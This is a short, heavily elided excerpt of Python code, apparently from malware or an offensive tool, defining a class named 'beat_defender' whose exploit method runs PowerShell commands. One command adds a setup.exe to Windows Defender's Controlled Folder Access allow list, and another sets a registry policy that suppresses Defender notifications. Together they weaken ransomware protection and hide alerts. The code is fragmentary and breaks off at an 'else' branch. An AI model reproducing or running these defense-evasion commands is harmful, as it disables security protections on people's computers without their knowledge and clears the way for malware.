...
class beat_defender:
    ...
    def exploit(self):
        if self:
            ...
            run(
                f'Set-MpPreference -ControlledFolderAccessAllowedApplications "{cwd}'
                + '\setup.exe"'
            )
            ...
            run(
                "Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration  -Name Notification_Suppress -Value 1"
            )
        else:
